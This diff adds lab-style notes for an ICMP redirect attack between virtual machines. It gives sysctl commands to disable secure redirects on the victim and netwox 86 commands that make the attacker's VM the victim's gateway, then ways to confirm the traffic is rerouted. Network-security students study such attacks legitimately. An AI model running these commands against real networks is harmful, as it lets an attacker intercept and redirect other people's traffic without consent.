@@ -1,0 +1,34 @@
+
+First, Do this on the victim machine : 
+sudo sysctl -w net.ipv4.conf.all.secure_redirects=0
+sudo sysctl -w net.ipv4.conf.default.secure_redirects=0
+sudo sysctl -w net.ipv4.conf.enp0s8.secure_redirects=0
+sudo sysctl -w net.ipv4.conf.lo.secure_redirects=0
+
+these should be 1 on attacker machine.
+
+From Attacker Terminal, Run (attacker and vms must be on same network):
+
+
+netwox 86 --device "Eth0" --filter "src host VICTIMIP" --gw VICTIM_REDIRECTED_GATEWAY_ATTACKERS_IP --code 1 --src-ip ACTUAL_GATEWAY_OF_VICTIM
+
+netwox 86 --device "Eth0" --filter "src host VICTIMIP" --gw VICTIM_REDIRECTED_GATEWAY_ATTACKERS_IP --code 1 --src-ip ACTUAL_GATEWAY_OF_VICTIM
+
+
+– Here VM1(192.168.181.141) use Netwox 86 to attack
+the route table of VM2(192.168.181.142) and
+associates itself as a new gateway using the original default
+gateway(192.168.181.2)
+
+
+after this, the attacker machine will act as the gateway for the victim machine. and
+not the victims actual gateway.
+
+to verify. we can ping OR run wireshark, or traceroute or route and see route from
+
+victim ip to dns
+
+it should have destination ip of attacker machine.
+
+
+
